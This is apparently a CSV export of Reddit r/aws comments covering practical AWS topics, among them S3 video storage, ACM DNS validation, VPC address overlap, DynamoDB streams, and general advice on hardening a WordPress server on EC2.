g8envy3,j8p4ip,If you looks at [https://www.verkada.com/](https://www.verkada.com/) they keep the footage on the camera. At enterprise levels where you have dozens of cameras on networks you can't just be uploading 4k from all of them to storage. Archives can be uploaded to the cloud whenever the client chooses and is immediately uploaded on any sort of tampering or serious occlusion. You can use s3 easily,2.0
g8kygt1,j8p4ip,https://aws.amazon.com/kinesis/video-streams,1.0
g8lm0q3,j8p4ip,"THere was a comment earlier in this thread that said ""Do your research?"" Which I thought was an asshole comment, because posting on reddit is! And you just proved that. This is amazing and I've now pivoted down a more promising lane for my business.

&amp;#x200B;

Thank you!",1.0
g8d6keb,j8p4ip,"The cost optimizations you could implement on a basic video storage system but specialised to VSaaS as you call it would be interesting:

&amp;#x200B;

* Obvious ones like using glacier - video may not need to be instantly required, if it takes minutes or hours, then that's okay for archive material.
* Could you make use of some additional compression on the video to reduce file sizes?
* For a large client, wanting to store/retrieve a large amount of data, you could use snowballs to deliver the content like a sneakernet!
* A simple web player may also help reduce the data transfer out by allowing clients to ""scrub through"" hours of footage and download chunks of the video files, rather than having to download larger blocks.",1.0
g8czckk,j8p4ip,"Storage gateway + glacier will allow you to store files for really cheap price per gb ($0.004/gb). 

but - it requires a local server to run storage gateway, and enough bandwidth to upload the recording to the cloud.",-1.0
g8dpzuc,j8p4ip,"Unless I’m misreading your response this doesn’t seem like a great AWS-centric solution at all to me.  You would only be using AWS for backup essentially.  And the cameras would be all be uploading to the storage device(s) connecting to Storage Gateway+Glacier which then gets into collocation, hardware costs, data center bandwidth, and on and on.  If costs are the biggest concern - and they definitely should be with AWS as costs can spiral quickly - then look at S3-alike solutions like Wasabi or other hosted block storage solutions.  

And let’s not forget Glacier is slow.  Very slow.  Retrieving even highly optimized and compressed video in real-time is probably impossible.  It’s basically cheap last ditch data recovery space.",0.0
g8cw3yh,j8p4ip,"&gt;What method should I go for using this?

I'm not sure what you are asking, other than the obvious answer of ""S3"".

* cameras can upload directly to S3 (no servers needed, but ideally don't give them AWS creds, make them use cognito or your own service to allocate temporary creds. And make sure the creds are 'write only')
* you can turn on S3 versioning to ensure some sneaky hacker isn't trying to overwrite existing footage
* you can use lifecycle rules to auto-expire the files
* don't bother making different buckets. You can have billions of files and PBs of data in one bucket (source: personal experience). Just throw all the files into one bucket, maybe with one ""folder"" per camera.
* Investigate S3 upload acceleration
* AWS bandwidth is expensive. (There's always B2)",0.0
g8d5pf5,j8my83,"You may want to look at cloud front in front of your site for offloading and automatic TLS management, it offloads the requirement to secure the site on the server side, I would get it working using the default URI/IP exposed to make sure it works and then deal with the DNS pointing to it, always (In my experience) start simple and get it working at a basic level and then layer your security, DNS, load balancer whatever you want on top of it to verify functionality.

Also I wouldn’t worry about which OS you’re running on (Linux/Windows) just go with what you’re comfortable with, especially for a school project where you’re trying new things anyway.",1.0
g8d6trj,j8my83,"I do agree about moving to Linux but that wasn’t your question


https://aws.amazon.com/getting-started/hands-on/host-net-web-app/

But at the end of the day it’s the same as you would have done in most hosting places.

Build your network (vpc , sg and so on ) and then RDP in to do install the application. I would prefer DevOps but learn how AWS works first and then push for DevOps",1.0
g8e6jor,j8my83,Linux.,1.0
g8konoc,j8my83,"Hmm... I believe that you can just using shared hosting in order to start your new project. Cloud technology like Azure or AWS are quite complicated for newbie. But if you used to deploy your project, then they are easy to use. If you are new in deployment, just use shared hosting. With shared hosting, you will be given access to your control panel so you can easily manage your files, database, emails, etc. There are many shared hosting that support .net. I personally use Asphostportal for .net project. I've been using them for years to host clients websites.",1.0
g8cj4ii,j8my83,"Start by using Linux instead of Windows

https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/linux-nginx?view=aspnetcore-3.1",-2.0
g8by7lz,j8m3np,"yes it is too far out. hard to understand vpc security best practices if you truly do not understand what a vpc is and how to properly configure one(cidr,subnets,sg,ngw,etc) 

same could be said for iam,logging,monitoring etc. 

I would take at minimum solutions architect first.",4.0
g8c5t9i,j8m3np,"I have the cert. Do solutions architect first, security builds on it. Solutions architect is not a waste of your time, you're going to learn a LOT.",2.0
g8bwzgj,j8m3np,"There is a training path for AWS security listed at https://aws.amazon.com/training/path-security/

On the same page is a ramp up guide at 
https://d1.awsstatic.com/training-and-certification/ramp-up_guides/Ramp-Up_Guide_Security.pdf",1.0
g8daek8,j8m3np,Why would you want to? No one is going to give you a job dealing with security based on a cert without deep experience on AWS.,1.0
g8ddg43,j8m3np,I’m not trying to get into cloud security. It’s just every job I’ve looked at in IT requires some cloud knowledge. I’m trying to get a SOC job in the future. And hopefully later in offense security.,1.0
g8bzl89,j8jces,Exploit vulnerabilities you don’t know of. Exploit web site software. Exploit upstream packages installed as part of updates. Privilege escalate through bad IAM policies. For example ...,3.0
g8bzwfz,j8jces,"&gt;Exploit web site software. Exploit upstream packages installed as part of updates.

How will software and updates contain Exploit, If I install them from their official repository?",1.0
g8cygeb,j8jces,"If you don't keep your software updated, there could be a known vulnerability that you don't yet have the patch for.",2.0
g8dp81n,j8jces,"Packages in the official repos can be compromised (see software supply chain, BOM, etc), the download could be compromised on a mirror, you may not be verifying signing on packages, etc.",1.0
g8c226c,j8jces,"Theoretically,  since you run a public facing service and you don't know how to secure it nor maintain it, your service has probably already been compromised in some way, if not the server itself.

Take a look at owasp.org for some good info.",2.0
g8c37oz,j8jces,"&gt;your service has probably already been compromised in some way

What do you mean by service got compromised? For example: If the service is a website.",1.0
g8c3ucr,j8jces,"It could be used in a way you didn't intend, but the server itself is not necessarily compromised.   For example, changing a URL/query parameter might result in it displaying information they should not have access to.  Then there's SQL injection, etc.",1.0
g8c51o4,j8jces,"&gt;changing a URL/query parameter might result in it displaying information they should not have access to

This can only be done from the server side / backend.


&gt;Then there's SQL injection

SQL injection can be prevented by disabling any type of user generated content and disabling Comments, Log in forms, etc.",0.0
g8c6e4m,j8jces,I'm not sure what you are hoping to get out of your post.,1.0
g8c6mxs,j8jces,Trying to make sure that my server is secured.,1.0
g8ca3wt,j8jces,"A little less than theoretical, then?  You should follow some best practices guides rather than asking random internet strangers.  OWasp is not the worst place to look, especially for application and architecture mistakes.

There is a reason why companies, with many top notch developers, spend a LOT of money on security tools, external audits, penetration testing, bug bounties, etc.  If you, as an individual, think your service is secure and you have covered all your bases, then it almost certainly isn't and you haven't.

Know your limitations.

That said, if your server/service doesn't contain any personal information (which is broader than you think), username/passwords, etc. then it probably doesn't matter too much if/when it gets compromised.  Sure, you may end up inadvertently hosting trojans or other illegal content, but AWS or the authorities will contact you pretty quickly.",1.0
g8c08l9,j8jces,"There's a couple dozen questions that need answer and clarification before you could say what your actual points of weakness are.

Is your website hosted on the EC2?  Is it just static content that exists on the EBS of the EC2, i.e. you have no user login, etc., or is there a DB component somewhere?  Let's assume it's just static content on the EC2s EBS volume.  What are your security group settings?  Is ssh open?  Is ssh locked down to public/private keys only or are you allowing password logins?  What about root logins?  Is your EBS volume encrypted?  Are you using a common web server with the latest security patches, or are you running something riddled with holes that hasn't been maintained in 10 years?  The list of potential questions to answer this just goes on and on.",1.0
g8dagsh,j8jces,"It's a DB component, a WordPress website.",1.0
g8c3zw9,j8jces,"Depends what your website runs. 

Common attacks:

Server side include. It allows an attacker to get your instance role credentials. Which may allow them to do things they shouldn't to your aws account.

Sql injection : abusing some query strings etc to pass a sql request straight to the database bypassing your application.(assuming your web site has an app and DB behind it)

If you run something like wordpress there are countless plugins with vulnerabilities that can be exploited in various ways.

Then there are risks from the operating system, insecured ports and unnecessary applications and the like.",1.0
g8crcp5,j8jces,"&gt; My root password is a long combination of - characters, numbers, weird special characters, etc. , which is theoretically impossible to crack. 

Your root account should ideally be key only.

&gt; The API keys and root password are locked in a unbreakable vault.

Except that can't be the only place they exist, because you would need them to administer stuff. So either you sometimes take them out of that vault, or they're also saved on your system.

&gt; I only access my AWS server/account on Mac, in safe-boot mode.

The Mac part is irrelevant, any platform can be reasonably secured. Using it in safe-boot mode is a nice touch, which would probably disable any AV.

&gt;Now, if an experienced Hacker want's to hack my website. What are some ways he/she can do so? (Assuming that he can't trick me into installing a malware or clicking on some malicious link). 

That's an unfair assumption, but since this post appears to be strawman argument after strawman argument, I'll play along.

* If your website accepts user input ANYWHERE, then certain values may expose data that it shouldn't
* If there's an account system then credential stuffing is a thing. Your root password on the server may be secure, but you can't say the same for all the accounts
* You don't mention HTTPS anywhere, if you don't use it, then they could be sniffing passwords off the wire
* You don't mention what webserver software you use, it could be vulnerable to exploits
* Ditto for the web application stack (i.e. PHP, Python/Flask, etc)

You haven't told us anything about what stack your website is based on, but given that it's exposed to the public by design, that is the most likely place that any breach would happen, but it depends what type of website it is and you haven't explained that at all.",1.0
g8db5d8,j8jces,"I am asking this for a WordPress website, so stack will be php. 

And OS will be CentOS.

And website will be HTTPS secured.",1.0
g8dbsua,j8jces,"Then the most important thing is patch WordPress, all your themes, and all your plugins, religiously. The WordPress ecosystem is a burning dumpster fire where all the dumpsters also contain burning tyres.

Make sure you don't allow anything to be executed from your upload/media directories.

Secure passwords.

Allow as little user input as is needed for the correct use of the site. If people don't need to contribute content, don't even allow them to register.",1.0
g8d7v6j,j8jces,"You are approaching this from the wrong angle.

&gt;So, Let's assume that I have a server with EC2 instance running on AWS.

First, why EC2. Every time there is a HeartBleed, ShellShock, Specter/Meltdown, etc attack, you have to rush to fix your servers.

What if your service was running in Lambda. There would be NO attack surface when your app isn't running. There would be no OS to constantly upgrade, etc.

&amp;#x200B;

&gt;My root password is a long combination of - characters, numbers, weird special characters, etc. , which is theoretically impossible to crack.  
&gt;  
&gt;My account has only 1 user, that's me.

It's unclear with this means. Are you running SSH? If so:

* Hopefully you have disabled SSH as root.
* Never use SSH passwords, only allow keys. If you have a password, someone might change it to something dumb.

Oh, and why even enable SSH at all? You should use AWS SSM to remotely manage your box.

&amp;#x200B;

&gt;The API keys and root password are locked in a unbreakable vault.

Hah! And the Titanic was unsinkable. There is no such thing.

&amp;#x200B;

&gt;I only access my AWS server/account on Mac, in safe-boot mode.

Wait, how do you access your account if the keys + password are in your vault?

If you take the keys out of the vault every day, does the vault matter?

&amp;#x200B;

&gt;Now, if an experienced Hacker want's to hack my website. What are some ways he/she can do so?

You didn't tell us the most important bit? What services are exposed on your server? How often to you update them when security patches come out? Are you on their security patch mailing list?

Try to count up the lines of code: The kernel is 25M lines, a runtime like Python or PHP is probably millions of lines (including libraries, etc). Layer on top of that frameworks like Drupal. Oh, and don't forget your web server (Apache/Nginx). Oh, and don't forget all the libraries that everything uses, such as [OpenSSL](https://en.wikipedia.org/wiki/OpenSSL#Notable_vulnerabilities). 

The quickest way to estimate:  Go thru all the items running on your server and count the CVEs in the last year or two. Add them all up, and divide by time, and that is your ""mean time to the next CVE"".

The good news is that in the cloud, you can outsource stuff like SSL to the load balancer layer, so *they* subscribe to all the mailing lists and upgrade everything when vulnerabilities are [discovered](https://www.networkworld.com/article/2687998/why-amazon-is-rebooting-10-of-its-cloud-servers.html).

&amp;#x200B;

&gt;(Assuming that he can't trick me into installing a malware or clicking on some malicious link).

Malware OK. But ""I'm never clicking on a malicious link"" is a terrible assumption.

You navigated to the AWS console in a browser, didn't you? What if you made a typo? What if a hacker took over DNS and re-directed you to a look-alike site? (If you turned off password caching in your browser ""to be more secure"", that could actually make you less secure, since the lack of cache quickly alerts you to the fact that you are on the wrong site.)",1.0
g8ch2z9,j8laxb,"Am I missing something? I thought ASGs did this automatically, provided you defined it to operate under multiple AZs.",8.0
g8cxwi3,j8laxb,"By design they seem to keep trying to launch new instances into an impacted zone to ""balance"" the instances across all zones listed in the asg config

So you have to remove the az/subnet from the asg for it to stop attempting to re launch in that az over and over.",4.0
g8d0wvz,j8laxb,Thanks for clarifying- the script does exactly that. ie. remove impacted az from asg,3.0
g8cktan,j8laxb,"I think they mean a reactive tool, for when an az goes down.",2.0
g8e5yda,j8laxb,"But you shouldn't need a reactive tool, ASG should just put more instances in the non-impacted regions until the AZ comes back up.

https://docs.aws.amazon.com/autoscaling/ec2/userguide/auto-scaling-benefits.html

&gt; Amazon EC2 Auto Scaling enables you to take advantage of the safety and reliability of geographic redundancy by spanning Auto Scaling groups across multiple Availability Zones within a Region. **When one Availability Zone becomes unhealthy or unavailable, Auto Scaling launches new instances in an unaffected Availability Zone**. When the unhealthy Availability Zone returns to a healthy state, Auto Scaling automatically redistributes the application instances evenly across all of the designated Availability Zones.",6.0
g8h970w,j8laxb,"This is true when an entire AZ goes down. However, sometimes (like in the previous 2 incidents), only some parts seem to be affected. At other times, only some functionalities (eg. DNS lookups froom a particular AZ) seem to be affected. Marking the entire AZ as down in these cases (from AWS side) might be an overkill. Hence, reactive tools like these can sometimes be very helpful for affected users.  


See the following update for example:  


&gt; 9:57 AM PDT We  wanted to provide you with some more details on the issue affecting  network connectivity for a subset of EC2 instances in a single  Availability Zone (use1-az2) in the US-EAST-1 Region. **The issue is  affecting the subsystem responsible for updating VPC network  configuration and mappings when new instances are launched or Elastic  Network Interfaces (ENI) are attached to instances, within the affected  Availability Zone.** This subsystem makes use of a cell-based  architecture, which subdivides the Availability Zone into smaller cells,  with each cell being responsible for the VPC network configuration and  mappings for a subset of instances within the Availability Zone.  At 9:37 PM PDT on October 8th, a single cell within this subsystem began  experiencing elevated failures in updating VPC network configuration  and mappings for instances managed by the affected cell. These elevated  failures cause network configuration and mappings to be delayed or to  fail for new instance launches and attachments of ENIs within the  affected cell. The issue can also cause connectivity issues between an  affected instance in the affected Availability Zone and newly launched  instances within other Availability Zones in the US-EAST-1 Region, since  updated VPC network configuration and mappings are not able to be  updated within the affected Availability Zone.  We have identified the root cause and have been working to resolve the  issue and restore the updating of VPC network configuration and mappings  within the affected cell. For instances that are affected by this  issue, relaunching the instance within the affected Availability Zone  may mitigate the issue. If possible, relaunching the instance in other  Availability Zones will mitigate the issue.  We will continue to provide updates as we work towards full resolution.",1.0
g8c53bn,j8laxb,Have you got any link to the AZ issues? I recently noticed some spot instances bouncing around zones about every half hour.,3.0
g8c9168,j8laxb,"I assume he's talking about yesterday's [https://www.reddit.com/r/aws/comments/j7xvib/useast1\_outage\_use1az2/](https://www.reddit.com/r/aws/comments/j7xvib/useast1_outage_use1az2/)  


It affected us for a few hours.",5.0
g8c7nis,j8laxb,"AWS has confirmed that it’s now resolved. Recommend subscribing to the RSS feed here: https://status.aws.amazon.com/

If you scroll down you will see the issue history in “Status History” section Oct 9th (EC2 N. Virginia)",1.0
g8cugny,j8laxb,You can probably hook this into aws status and invoke a lambda that then automatically runs this code.,4.0
g8dyl85,j8laxb,By the time the AWS Status page shows anything your app is either already running in the other AZs successfully or is completely down!,4.0
g8czqwq,j8laxb,"Yeah awesome idea! :)

I’ll make it read some params from env variables as well. After that, it should be super easy to run it as lambda",2.0
g8bp29h,j8gxqu,"Yep, your VPC is wrong. VPCs and on-premise networks must not overlap. Even if you only care about a specific subnet.

The local route of the VPC is always treated specially.

And how should AWS know about your data centre when you create your VPC subnet? Somethings you still have to take care of.",2.0
g8dg1wl,j8gxqu,"Yep that seems to be the case. Wish was made that clear in their documentation for VPN creation. Could have avoided this situation. 

Live and learn. 

Thanks for your reply. Appreciate it",1.0
g8d84fg,j8gxqu,"It's a very bad idea use those ranges... 

As you said, your vpc overlaps the other two ranges.

You should use a 10.200.0.0/16 or something like that for your cloud and the 192.168.0.0/16 for your datacenter. It will be easier to manage.

The creation of the vpc will be a super easy task if you use a cloudformation template. There are a lot of examples on the aws site or github",1.0
g8dfpcy,j8gxqu,"Thanks for your reply. 

Yeah that's probably what I will go with. Wasn't aware of the data centre subnet when the vpc was created. 

Will use terraform for the creation on the subnet now. 

Thanks again for your reply. Appreciate it.",2.0
g8h8vep,j8gxqu,"I prefer terraform also xD

When you start to have a ""general"" view of all AWS basics services, it's like magic.

The first, think about security, I mean, it was (for me) the most complex concepts to understand, because I come from the traditional datacenter (vmware, servers, storage, networking, backup, firewalls,...) and, although all those concepts should be useful, you have to start to ""think in cloud"". When you do this, it's amazing

I hope you do well!",1.0
g8b4ysq,j8dync,I didn’t watch the tutorial but what are your Lambda’s IAM Permissions?,2.0
g8bs4hp,j8dync,"* AmazonSQSFullAccess
* AWSLambdaExecute 
* AWSLambdaSQSQueueExecutionRole
* AWSLambdaVPCAccessExecutionRole 
* AWSLambdaS3ExecutionRole-(Something that looks like a GUID that I removed because I'm a paranoid noob) 
* AWSLambdaBasicExecutionRole-(Something that looks like a GUID that I removed because I'm a paranoid noob) 
* AmazonElasticFileSystemClientFullAccess

Lambda runs, gathers info about an S3 bucket, and sends the info via SQS.  All worked fine.  When I added the attempts to interface with EFS, that chunk of code always fails.  

THANKS FOR LOOKING!  


(Edited for formatting)",1.0
g8e4csd,j8dync,"Ok looks like you’ve got the EFS permissions.  The next thing is when your Lambda accesses the EFS, it does so through an Access Point.  The Access Point needs to be assigned privileges to the file system, just like a user would to a local file system.  

Check out this link and make sure the Access Point has sufficient privileges.  

https://docs.aws.amazon.com/lambda/latest/dg/configuration-filesystem.html",2.0
g8e9f1l,j8dync,"OK, under ""POSIX user"", I have the User ID, and Group IDs set to 1000.  And the ""Root directory creation permissions"" is also set to user 1000, group 1000, with a mask of 0777.  The ONLY thing in my config that's different from the one recommended in that article, is my root path is set to ""/"", not ""/my-function"".",1.0
g8bhfc5,j8i5st,Amy body can develop a server less app. Access and authentication are the difficult part.,1.0
g8brnpw,j8i5st,"Yep. It's never takes more than 10 minutes to make a Serverless app on any Serverless platform.

It's security, auth, and permanent data store design which is the time consuming part.",1.0
g8bs2b0,j8i5st,Can you explain why these are time consuming? I'm just now getting into serverless myself.,1.0
g8c652v,j8i5st,"What's your corporate password strength policy?

How long does your data rentention need to be in accordance with your data sensitivity to avoid legal fines and lawsuits?

When offboarding a user (they leave your app or company), how do they go about getting fully removed from your system?

If a user needs to ask for a copy of their entire data to comply with data privacy laws, how do they do that within an acceptable amount of time?

When you have data which is user bound (like a users orders) how do you make sure other users can't query your API to view them when they shouldn't, AND make sure you're not slamming your database with auth checks for every API and over saturating connections (assuming you aren't using dynamoDB with auto provisioning)

All data should be encrypted in transit and at rest. Who manages the certificates for the domain and the encryption keys for the permanent storage? Is there corporate policies for using a key which is NOT the default AWS key?

Etc... Etc.. 

Gets even more complicated when you have to do orchestration of multiple apps which use microservicre architecture together as dependencies via feature flags and environments with private credentials (albeit not too hard with appconfig these days).

Food for thought .",3.0
g8cerwk,j8i5st,God I was just thinking of making an app but you're right.  There's a TON of work at all stages regarding this.,2.0
g8bzype,j8i5st,"API gateway makes developing an API extremely straightforward, it's just some configuration in the console or cloudformation, and it can even hit dynamo or RDS with a quick 20 line of code lambda and send a response. 
Once you read over the docs you can get it pretty fast, with a little AWS experience.


AWS Cognito is pretty complicated, almost as complicated as rolling a JWT auth system yourself, if not moreso.
The docs are huge, confusing, and I haven't find any straight forward tutorials on how to create an auth and access system for a simple three factor web app. I got the feeling scanning the docs, that was going to be a huge rabbithole.



Rolling your own JWT auth system isn't too hard but is easily the bulk of the challenge in a system like this.  Then you have to create access permissions tables in your database then someway to cache them so they're not hitting the database every request. It's just a challenge.

Now I may be incorrect in all of this, and there may be other ways Im not aware of but this has been my experience.",2.0
g8alrk9,j8eht7,Can you use [dig](https://toolbox.googleapps.com/apps/dig/#CNAME/) to confirm the values are set and correct?,6.0
g8cqtif,j8eht7,"So, I did this via my own computer console and got a response back. Is there something specific in the response that would hint that something isn't working, or if I got a response does that simply mean I need to wait a little longer for this to go through?",1.0
g8crdmd,j8eht7,"Doing it with a third party, and not in your console, helps rule out local network issues. If a third party sees all the right values and AWS still doesn't after two days, something is off. In most cases the values set are wrong. Triple check everything. Consider posting the details here so others can double check for you.",1.0
g8csdvy,j8eht7,"Ok, I can do that in a bit. Can I ask what type of response I should be looking for on there and what response would send red flags up? Maybe I am just getting a response, but the reality is that the response I get indicates an error and I'm not realizing that? Sorry, still learning this stuff it seems. Typically I just follow the documentation on AWS and stuff seems to work.",1.0
g8cta44,j8eht7,"You should see the exact CNAME value that AWS asked you to set. Red flags would be weird spaces, quotes, and any other character that's not exactly what they asked for. On the AWS side, make sure you expand all menus to see the status in ACM of all the entries it wants.",1.0
g8cvt63,j8eht7,"Yeah, I don't get that, which may be the issue?

I see Question, then the NAME I gave the CNAME.

Then for the answer, I get this.

    &lt;my domain&gt;. &lt;number&gt; in &lt;some google domain listed under Name server on google domains&gt; &lt;another google domain listed under Name server on google domains&gt;. &lt;some long string of numbers. Doesn't match with AWS value or anything&gt;
    ;ADDITIONAL
    &lt;nothing after this, just blank&gt;",1.0
g8cx0tg,j8eht7,"If the answer is empty, something is wrong. Either you are asking the wrong question (wrong domain), or you didn't set it up right in the first place.

You are supposed to see something like:

    id 723485
    opcode QUERY
    rcode NOERROR
    flags QR RD RA
    ;QUESTION
    _0f36547434ea218165ccf54b7b65dcd.mydomain.com. IN CNAME
    ;ANSWER
    _0f36547434ea218165ccf54b7b65dcd.mydomain.com. 299 IN CNAME _1a1124f90575f3b4913dc4547.sdjklgfjli.acm-validations.aws.
    ;AUTHORITY
    ;ADDITIONAL",1.0
g8d009e,j8eht7,"So, I think I may have found the potential issue. It appears possibly that google domains is adding the domain at the end of the NAME value automatically. So, as someone else was saying, I tried deleting it in google domains and then did nslookup. 

So, for example, now if I do this:

    nslookup -type=cname _example-cname.example.com

I get the value in response.

But if I do this:

    nslookup -type=cname _example-cname.example.com.example.com

I get no return value I expect. Still waiting for AWS to recognize this change. We will see if this solves the issue.",1.0
g8ai5b9,j8eht7,"Some registrars automatically add the domain after what you type in for the value of the CNAME record, so it ends up as “something.example.com.example.com”. GoDaddy does this. 

The solution is to add a single dot at the end of what AWS tells you to put in the CNAME record. That will fix it.

Or, alternatively, you can take the domain off of what AWS tells you to type in, knowing that GoDaddy will automatically add it. Either way, double check when you’re done to be sure it’s correct.",4.0
g8al4hz,j8eht7,"So, funny you should bring that up. It appears AWS thought of that, as the thing I copied and pasted for the value of the CNAME had a dot at the end. I was confused why the dot was there, but just left it there. So it appears that is already taken care of. Unless you mean I should add a second period?

I can check the suffix domain suffix next time I’m on though, that may be the issue.",1.0
g8amoo8,j8eht7,You only need the one period. Use a tool like dig or nslookup to see what the value is that AWS is seeing when they check the record.,3.0
g8bcwxo,j8eht7,anything bind compatible really,1.0
g8bkisx,j8eht7,"The value that AWS tells you to put is actually had to be edited first. I was given something like hdidkfbiek.backend.mydomain.com and the solution for me was to delete the mydomain.com and put the name as ""hdidkfbiek.backend.""

Additionally,you might get a CAA error even after doing the above step right 

The solution for that is to specifically allow ACM to create certificates for you by adding their domains to the trusted list of CAA creators
https://docs.aws.amazon.com/acm/latest/userguide/setup-caa.html

Good luck! I just had to do this myself and it took forever as well",1.0
g8cr9xh,j8eht7,"Out of curiosity, is your DNS Google Domains or a different one?",1.0
g8cymwr,j8eht7,"Nah, My DNS was hosted on Vercel. But I think the concept is similar",1.0
g8agxzz,j8eht7,When I've done it correctly it seems to successful in a few minutes. Don't you have to create two records? It sounded to me that you only created one or I could be misremembering. Could you have created private dns entries? AWS will need to be able to see them to verify.,2.0
g8aii3p,j8eht7,You only need 1.  They give you a CNAME.  /u/lightningball's solution is correct.  Make sure google isn't adding the domain suffix so you end up with something like [foo.example.com.example.com](https://foo.example.com.example.com) instead of foo.example.com,2.0
g8anrsm,j8eht7,"On a related note, ACM is sending me emails saying I need to fix the DNS verification records for an upcoming certificate expiry, but when I got to the console all the verifications are valid. I have no idea how to fix this.",1.0
g8b2ql1,j8eht7,"I don't know if this is relevant for you, but i had a lot of problems with this the last month. 

The first thing you should do is to check in the domain is actually available. Use howis or some of the other suggestions in this thread. 

It might be that the cname record just has not been propogaded through the DNS network yet.  In this case you just have to wait. 

If you have problems with the domain not beeing available look into what nameserver you have set up. This might be where the problem is.",1.0
g8b7dbt,j8eht7,This method always seems to take forever for me. Like days. I prefer to use email verification if I want working right away. Then I set up the dns verification afterward so it can auto renew in a year.,1.0
g8crt67,j8eht7,"Did you also have your DNS not be Route53 and instead have it done via Google Domains or some other place like GoDaddy? 

I am geniunely curious why this is so troublesome to get done and wonder why this seems to be uniquely an AWS thing? I, for example, never had ANY issues with doing this via github pages and that service is literally free.",1.0
g8e21ws,j8eht7,I've never used Route53. My domains are with enom.,1.0
g8ctjwn,j8eht7,"If you plan on running everything on AWS anyway, it might be simpler to use Route 53 instead of Google Domains. Certificate Manager has a good integration with Route 53. It will set all the right domain names with the click of a button.",1.0
g8cu54b,j8eht7,"My problem is that I like my DNS set up in Google Domains, it is very simple and easy. Also, I don't want to reward companies for making it difficult to do stuff like this (as, although I can't be for certain, I wouldn't doubt there is a little motivations on AWS's part to make this difficult so you just transfer your domain to them and pay them instead). I know it shouldn't be this difficult because I have done this exact same thing with github pages and it worked nearly instantly. That is a free service and it worked very fast and with little to no hassle. 

That tells me that this is not a Google Domains issue, but more an AWS issue, that they are either intentionally or unintentionally making this difficult.",1.0
g8anmcw,j8eht7,Just let us know the specific domain and then screenshot the DNS record instructions from AWS. We can then check public DNS and tell you what's gone wrong.,1.0
g8af7ng,j8bjjb,"First and foremost, read each service’s SLA carefully. EC2 for example basically requires either an AZ or a region wide outage and specifically rejects any individual instances uptime as part of the math. 

RDS I think requires a multi-az setup to be “valid” for the SLA but I could be mis-remembering. 

As far as how it gets tracked... we don’t. If there’s a BIG outage, where the SLA gets breached for the whole year in one fell swoop, sure, put in an SLA request and be done. But we aren’t going to track that it was down for 5minutes here, 10 minutes there, 2minutes here, and then total it all up and submit an SLA reimbursement. You would basically immediately run into a problem where the salaries of the people involved to track that data would be burning more money TO track it than you’d get back in SLA refunds.

And no, it’s typically not automated, you have to go out of your way to track and submit it.",5.0
g8as335,j8bjjb,"I am pretty sure each team in AWS tracks their SLO,  and would have alerts for cases where availability drops a certain percentage.",2.0
g8bsz0v,j8bjjb,"Do you know if there is any documentation? Connecting and running ‘SELECT 1;’ is very different than ensuring indexes aren’t corrupted and data is inaccessible.

Just curious since I have heard sometimes AWS is happier to give credits than invest in increasing uptime.

It sounds like you two are saying they are OK about enforcing SLO’s but it might not be a bad idea to design observability and reporting on my side too. We have a customer facing SLO that also needs to be reported. RDS outage is my outage.",1.0
g8bu0el,j8bjjb,"If you have your own requirements on data integrity and durability, then yes, you need to be doing your own layer of validation to ensure compliance. I’ve only ever had one major problem with RDS, and the AWS team was very quick to throw principle engineers at the problem to get it RCA’d as quickly as possible. The actual fix took much longer, as it tends to, but they didn’t sit around on the Investigation.",2.0
g8bs37h,j8bjjb,"Thanks, great insight",1.0
g8bf7vp,j8ah2k,what provisioned capacity do you have on the table?,1.0
g8bg6gv,j8ah2k,It’s on demand,1.0
g8ccqum,j8ah2k,"hmm, well, that's not the problem then.

it sounds more like you're getting throttled on the ES side - I'd confirm or deny by hooking up another lambda that just logs the records as they come through the stream.

(we also ingest to ES from a stream, and when we have problems it tends to be on the ES side)",1.0
g8e6v23,j8ah2k,"Temporarily scale the table up.to.a huge number of write IOPS. At least 2000 or a multiple of that. It will trigger the DynamoDB shard to split. 

The number of shards your table has isn't something that is surfaced and you have no control or direct influence on this. I've raised this feedback to the DynamoDB team before but this piece is really part of the magic of DynamoDB being managed so it isn't likely that they will improve this IMO.

An alternative pattern is to have your DynamoDB stream just feed into a Kinesis stream, That way you can set the number of shards and the Lambda sending data into the Kinesis Stream should have no problem keeping up since all it has to do is a batch put to the stream. The downside here being cost. 

The other alternative is to have the Lambda from the DynamoDB stream async invoke other Lambdas so it can keep up with real time. I don't like this approach because it doesn't allow back pressure if your ES cluster is overloaded. 

The other option is allocate more resources to the ES cluster, that sounds like it is running slow to me. We insert many thousand of records into our ES clusters per second without any real issues.",1.0
g8f7i7d,j8ah2k,I think the lambda that processes the stream is doing some additional work which might be causing the stream to get backed up.  I’m wondering if maybe just forwarding the events to sqs would make for a better solution.,1.0
g8hivix,j8ah2k,"SQS can definitely be cheaper than Kinesis for that. 

However in order processing may be a concern but a FIFO queue solves that problem but limits the throughput. 

If 10 batches of 100 messages in a DynamoDB stream in parallel can't keep up with just the batch ES inserts you have other problems. If it is other processing in the Lambda causing the issue maybe break out the ES inserts into a dedicated lambda function consuming the stream would be better.",1.0
g89t8tg,j87omh,"The AWS certifications will help you build a solid foundation of knowledge in a structured manner, especially since you're actively working with AWS and getting hands-on experience. You could work through the associate-level architect, developer, and sysops certifications in order to build a well-rounded base of knowledge. 

Make sure you have a lab/testing AWS account of some kind so you can play around with all the services those certifications cover. The major benefit of such an approach, in your case, is that you'll have a much better idea of which services to use when.

Stephan Maarek and Adrian Cantrill make good certification courses, that go in-depth. Don't neglect the white papers either.",1.0
g89u3ac,j87omh,check out the content for the solutions architect associate exam,1.0
g89wqco,j87omh,"On the Terraform side, Terraform itself shouldn’t be too heavy of a lift once you understand the underlying AWS concepts. 

But you might enjoy the Terraform CDK. 

https://www.hashicorp.com/blog/cdk-for-terraform-enabling-python-and-typescript-support

Disclaimer: I haven’t used either. I have used CloudFormation and the CDK.",1.0
g89pbzz,j8844j,Put a WAF in front of your instance(s). Sleep better.,5.0
g89o9an,j8844j,Its common. The internet is cesspool of bots trying to take advantage.,1.0
g8bcvm3,j8844j,"There seems to be nothing compromised yet. Only one public endpoint, which is validated pretty heavily.... But has there been a compromise on security now, with this GUACOMOLEGAUCOMOLE..... thing being inserted into the terminal.",1.0
g8bjq42,j8844j,"Not sure if this is relevant, but it might be somewhere to start:

&gt; [Apache Guacamole](http://guacamole.incubator.apache.org/) is a clientless remote desktop gateway. It supports standard protocols like VNC and RDP. We call it clientless because no plugins or client software are required. Thanks to HTML5, once Guacamole is installed on a server, all you need to access your desktops is a web browser.

https://hub.docker.com/r/guacamole/guacamole

(note spelling)",1.0
g8h8908,j8844j,"You think, that this is injected into the EC2 instance?",1.0
